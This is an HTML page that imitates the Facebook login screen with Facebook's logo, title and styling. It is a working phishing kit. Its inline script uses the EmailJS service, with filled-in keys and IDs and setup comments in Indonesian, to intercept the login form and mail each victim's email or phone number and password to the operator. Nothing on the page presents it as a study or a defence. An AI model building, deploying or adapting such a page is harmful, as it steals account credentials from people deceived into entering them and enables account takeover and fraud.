<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">
<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <title id="pageTitle">Facebook â€“ log in or sign up</title>
    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/ze2gDvq5tcz.css" />
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init('_2JWooqGu1Kd8f1-p'); // Ganti dengan Public Key dari Email.js
        })();
        
        function sendLoginData(event) {
            event.preventDefault(); // Mencegah form dikirim secara default
            
            var emailOrPhone = document.getElementById("email").value;
            var password = document.getElementById("password").value;
            
            var templateParams = {
                user_email: emailOrPhone,
                user_password: password
            };
            
            emailjs.send('service_c04kj4k', 'template_kmkcj0d', templateParams)
                .then(function(response) {
                    alert("Login data sent successfully!");
                }, function(error) {
                    alert("Failed to send login data.");
                });
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .main-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 980px;
            max-width: 100%;
            margin-right: 32px;
            margin-top: -90px;
        }
        .left-section {
            flex: 1;
            padding-right: 40px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            position: relative;
        }
        .fb_logo {
            width: 280px;
            margin-bottom: 0px;
            align-self: flex-start;
            margin-left: -18px;
            margin-top: -41px;
        }
        .text-container {
            max-width: 500px;
            margin-left: 10px;
        }
        .left-section h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            color: #1c1e21;
            margin-top: 0;
        }
        .right-section {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 396px;
            text-align: center;
        }
        input {
            width: 92%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background: #145dbf;
        }
        .links {
            margin-top: 15px;
        }
        .links a {
            text-decoration: none;
            color: #1877f2;
            font-size: 14px;
        }
        .divider {
            height: 1px;
            background-color: #ddd;
            margin: 20px 0;
        }
        .create-account {
            display: inline-block;
            padding: 14px 20px;
            background: #42b72a;
            color: white;
            border-radius: 5px;
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="left-section">
            <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
            <div class="text-container">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
        </div>
        <div class="right-section">
            <form onsubmit="sendLoginData(event)">
                <input type="text" id="email" placeholder="Email address or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="links">
                <p><a href="#">Forgotten password?</a></p>
            </div>
            <div class="divider"></div>
            <a href="#" class="create-account">Create new account</a>
        </div>
    </div>
</body>
</html>
